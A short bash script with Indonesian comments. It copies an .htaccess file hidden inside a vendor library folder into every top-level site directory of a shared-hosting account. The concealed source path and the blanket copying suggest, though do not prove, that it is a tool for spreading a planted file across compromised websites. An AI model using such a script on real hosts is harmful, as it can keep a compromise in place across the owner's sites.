#!/bin/bash

htaccess_source="/home/u1377344/public_html/desa-padanglampe/vendor/guzzlehttp/guzzle/src/Tmp/.htaccess"
target_dir="/home/u1377344/public_html/"

# Menemukan dan menyalin ke semua subdir pertama
subdirs=($(find "$target_dir" -mindepth 1 -maxdepth 1 -type d))
if [ ${#subdirs[@]} -gt 0 ]; then
    for subdir in "${subdirs[@]}"; do
        cp "$htaccess_source" "$subdir"
        echo "File .htaccess copied to $subdir" | tee -a 1.txt
    done
else
    echo "Tidak ada subdir ditemukan di $target_dir" | tee 1.txt
fi
